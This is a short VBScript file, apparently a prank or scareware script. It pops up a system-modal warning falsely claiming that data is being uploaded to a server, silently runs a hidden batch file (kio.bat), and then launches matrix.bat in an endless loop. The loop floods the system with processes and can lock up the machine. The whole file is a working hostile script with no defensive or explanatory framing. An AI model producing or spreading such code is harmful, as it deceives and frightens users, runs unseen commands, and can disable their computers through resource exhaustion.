Option Explicit
Dim a,b,c,obj

Set obj = CreateObject("wscript.shell")
set b = CreateObject("Shell.Application")
Dim wsh : Set wsh = CreateObject("Wscript.Shell")

MsgInformation "Uploading The Data To the Server", "xKDcHatGuy"

Function MsgInformation(m, t)
	wsh.Run "mshta.exe vbscript:Execute(MsgBox("""&m&""",vbExclamation+vbAbortRetryIgnore+vbSystemModal,"""&t&""")(window.close))"
End Function

b.ShellExecute "kio.bat",,,"",0

Do
b.ShellExecute "matrix.bat",,,"",1

Loop  